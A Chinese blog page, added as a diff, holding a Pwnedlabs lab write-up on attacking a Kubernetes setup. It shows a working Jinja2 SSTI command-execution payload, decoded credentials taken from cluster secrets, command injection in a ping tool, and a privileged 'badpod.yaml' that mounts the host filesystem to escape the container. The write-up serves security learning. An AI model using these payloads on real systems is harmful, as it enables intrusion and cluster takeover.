@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-09-26">2025年9月26日</time>
+        
+        
+          <span class="post__readtime">5 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/k8s/">#k8s</a><a class="tag" href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/">#云原生</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">【Pwnedlabs】Exploit Kubernetes Overly Permissive RBAC</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h2 id="Exploit-Kubernetes-Overly-Permissive-RBAC"><a href="#Exploit-Kubernetes-Overly-Permissive-RBAC" class="headerlink" title="Exploit Kubernetes Overly Permissive RBAC"></a>Exploit Kubernetes Overly Permissive RBAC</h2><blockquote>
+<p>背景</p>
+<p>贵公司受聘对新客户的数字基础设施进行渗透测试。经过初步侦察后，您发现可以访问一个凭证已被盗用的 EC2 实例。该实例可能充当了客户 Kubernetes 环境的网关。您的任务是利用这些凭证，探索潜在漏洞，并利用其 Kubernetes 设置中的弱点，最终获得其服务器的 root 级访问权限。</p>
+</blockquote>
+<p>目标:10.1.20.179</p>
+<h3 id="目标与环境识别"><a href="#目标与环境识别" class="headerlink" title="目标与环境识别"></a>目标与环境识别</h3><p>一个演唱会购票页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261458501.png" alt="image-20250926145812322"></p>
+<p>随意买一场门票并输入信息之后 会自动生成并下载一个pdf文件。pdf中包含输入的昵称信息</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261501425.png" alt="image-20250926150115369"></p>
+<p>触发了一个报错,  我只在flask里面见过这样子的<code>Method Not Allowed</code> 也可能是我见得少🤣</p>
+<p>所以我认为后端是由python flask框架起的一个http服务</p>
+<p>由于它做了一个nginx反向代理。 我并没有在数据包或者页面返回头中找到更有效的证据来指明他是python flask应用</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261519647.png" alt="image-20250926151939512"></p>
+<h3 id="SSTI漏洞利用与初始立足"><a href="#SSTI漏洞利用与初始立足" class="headerlink" title="SSTI漏洞利用与初始立足"></a>SSTI漏洞利用与初始立足</h3><p>然后我在昵称信息表单中输入一个经典的SSTIpayload<code>&#123;&#123; 7 * 7 &#125;&#125;</code>， 然后我就如愿以偿的得到了一个经典的回显<code>49</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261524041.png" alt="image-20250926152419983"></p>
+<p>现在已经确定存在SSTI漏洞,利用<code>&#123;&#123;lipsum.__globals__['os'].popen('id').read()&#125;&#125;</code>执行命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261526448.png" alt="image-20250926152615397"></p>
+<p>建立反向Shell</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261539011.png" alt="image-20250926153916971"></p>
+<p>目前我们处在一个<code>pod-a</code>的docker容器中</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261539624.png" alt="image-20250926153955590"></p>
+<h3 id="容器内信息收集与横向移动"><a href="#容器内信息收集与横向移动" class="headerlink" title="容器内信息收集与横向移动"></a>容器内信息收集与横向移动</h3><p>从环境变量中可以看出 该pod处于在一个k8s集群中</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261545772.png" alt="image-20250926154508716"></p>
+<p>容器中没有<code>kubectl</code> 用curl下载一个kubectl的二进制文件到容器中</p>
+<p>然后执行<code>kubectl auth can-i --list</code>来看一下我们有什么权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261556186.png" alt="image-20250926155608130"></p>
+<p>发现可以get&#x2F;list secrets</p>
+<p>在secrets中找到了一组用户名与密码</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261559232.png" alt="image-20250926155915161"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;c2FraHNhakA3OHdxa2hzbGl3cXNoQCp5dTk4b2kyMQ==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">sakhsaj@78wqkhsliwqsh@*yu98oi21                                                                     </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;YWRtaW4=&quot;</span> | <span class="built_in">base64</span> -d                                    </span><br><span class="line">admin </span><br></pre></td></tr></table></figure>
+
+<p>用netstat看开放的端口貌似就只开放了一个5000端口</p>
+<p>用curl下载一个nmap进行同网段主机发现</p>
+<p>没有<code>ip</code>命令 用<code>ifconfig</code>可以看到网卡信息</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261630000.png" alt="image-20250926163042888"></p>
+<p>namp进行主机发现发现四台存活靶机</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261636495.png" alt="image-20250926163614440"></p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>服务</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10.244.0.1</td>
+<td>可能是网关</td>
+</tr>
+<tr>
+<td>10.244.0.10</td>
+<td>可能是节点&#x2F;服务</td>
+</tr>
+<tr>
+<td>10.244.0.11</td>
+<td>CoreDNS Pod</td>
+</tr>
+<tr>
+<td>10.244.0.12</td>
+<td>发起扫描的pod</td>
+</tr>
+</tbody></table>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261704907.png" alt="image-20250926170424856"></p>
+<h3 id="代理搭建与内网渗透"><a href="#代理搭建与内网渗透" class="headerlink" title="代理搭建与内网渗透"></a>代理搭建与内网渗透</h3><p>用Venom将流量代理出来</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261713101.png" alt="image-20250926171349049"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261714154.png" alt="image-20250926171401109"></p>
+<p>建立一个socks代理</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261714526.png" alt="image-20250926171446477"></p>
+<p>挂上代理访问<code>http://10.244.0.10:5000</code></p>
+<p>页面重定向到了登录页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261717175.png" alt="image-20250926171722127"></p>
+<p>这时候试着用刚才在<code>pod-a</code>中获取的账户与密码进行登录</p>
+<p>登录进去之后有一个ping tool</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261719236.png" alt="image-20250926171919189"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261719823.png" alt="image-20250926171929741"></p>
+<p>一眼顶真。老套路<code>/bin/sh ping &lt;your input&gt;</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261721128.png" alt="image-20250926172124083"></p>
+<h3 id="权限提升与集群控制"><a href="#权限提升与集群控制" class="headerlink" title="权限提升与集群控制"></a>权限提升与集群控制</h3><p>建立反向Shell，之后再拿一个kubectl到pod-b</p>
+<p>然后执行<code>kubectl auth can-i --list</code>来看一下我们有什么权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261729503.png" alt="image-20250926172925434"></p>
+<p>有这么一条记录<code>*.*                []                     []              [*]</code>这意味着你几乎拥有 <strong>集群管理员权限</strong></p>
+<p>因此。我们就可以创建一个恶意pod。然后从pod中逃逸出去</p>
+<p>创建一个<code>badpod.yaml</code>文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">breakout-pod</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">breakout-app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">breakout-container</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">hac10101/soldoutmaster_concert_app_ctf:latest</span></span><br><span class="line">    <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>]</span><br><span class="line">    <span class="attr">args:</span> [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep infinity&quot;</span>]</span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;512Mi&quot;</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;500m&quot;</span></span><br><span class="line">      <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;1Gi&quot;</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-volume</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">      <span class="attr">readOnly:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261745801.png" alt="image-20250926174507755"></p>
+<p>创建容器之后进入容器将设备 <code>/dev/root</code> 挂载到 Pod 内的 <code>/tmp/root</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509261747244.png" alt="image-20250926174740176"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    </p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202510062029666.png"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-07-16">2025·07·16</time>
+          <a class="related__link" href="/2025/07/16/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F/k8s%E6%90%AD%E5%BB%BA/">k8s搭建记</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/10/08/%E4%BA%91/Exploit%20Jenkins%20in%20the%20Cloud/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">【Pwnedlabs】Exploit Jenkins in the Cloud</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&%20Perimeter%20Leak/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
